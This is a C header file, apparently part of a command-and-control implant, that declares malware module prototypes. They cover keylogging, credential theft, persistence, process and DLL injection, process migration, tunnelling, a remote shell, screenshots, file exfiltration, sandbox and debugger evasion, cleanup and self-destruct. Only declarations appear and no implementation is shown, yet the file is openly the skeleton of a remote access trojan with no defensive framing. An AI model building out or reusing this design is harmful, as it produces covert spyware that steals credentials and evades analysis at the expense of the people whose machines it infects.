#ifndef C2_MODULES_H
#define C2_MODULES_H
#include "common.h"
#include "config.h"
#include "json.h"
#include "proto.h"

/* ---- JSON helpers (implemented in modules.c) ---- */
void jesc(buf_t *b, const char *s);
void jkey(buf_t *b, const char *k);
void jstr(buf_t *b, const char *k, const char *v);
void jint(buf_t *b, const char *k, long long v);
void jbool(buf_t *b, const char *k, int v);
void jraw(buf_t *b, const char *k, const char *raw);

/* ---- lifecycle ---- */
void c2_modules_init(config_t *cfg);
void c2_modules_fini(void);
config_t *c2_config(void);
void c2_config_set(config_t *cfg);
/* post an async message into the client send queue (thread safe) */
void c2_post(u8 type, const void *data, size_t len);
/* ask main loop to exit (self-destruct) */
void c2_request_shutdown(void);
/* runtime sandbox/VM/debugger assessment */
int  c2_guard_assess(config_t *cfg, buf_t *report_json, int *hits);
void c2_guard_sleep_if_needed(config_t *cfg);

/* ---- core modules ---- */
int mod_sysinfo(const json *args, buf_t *out);
int mod_shell(const json *args, buf_t *out);
int mod_ps(const json *args, buf_t *out);
int mod_ls(const json *args, buf_t *out);
int mod_cat(const json *args, buf_t *out);
int mod_download_begin(const json *args, buf_t *out);
int mod_download_chunk(const json *args, buf_t *out);
int mod_upload(const json *args, buf_t *out);
int mod_rm(const json *args, buf_t *out);
int mod_mv(const json *args, buf_t *out);
int mod_mkdir(const json *args, buf_t *out);
int mod_sleep(const json *args, buf_t *out);
int mod_screenshot(const json *args, buf_t *out);
int mod_keylog_start(const json *args, buf_t *out);
int mod_keylog_stop(const json *args, buf_t *out);
int mod_keylog_dump(const json *args, buf_t *out);
int mod_guard(const json *args, buf_t *out);
int mod_env(const json *args, buf_t *out);

/* ---- advanced modules ---- */
int mod_persist_install(const json *args, buf_t *out);
int mod_persist_status(const json *args, buf_t *out);
int mod_persist_disable(const json *args, buf_t *out);
int mod_tunnel_open(const json *args, buf_t *out);
int mod_tunnel_data(const json *args, buf_t *out);
int mod_tunnel_close(const json *args, buf_t *out);
int mod_inject(const json *args, buf_t *out);
int mod_inject_dll(const json *args, buf_t *out);
int mod_migrate(const json *args, buf_t *out);
int mod_creds(const json *args, buf_t *out);
int mod_cleanup(const json *args, buf_t *out);
int mod_selfdestruct(const json *args, buf_t *out);

/* shared helpers implemented in modules_adv.c, used by modules_adv2.c */
void persist_name(char *out, size_t cap);
void keylog_init(void);

/* parse a TASK payload (JSON) and execute. Returns 0 and fills result object. */
int c2_mod_execute(const char *module, const json *args, buf_t *result_obj, int *ok);

#endif
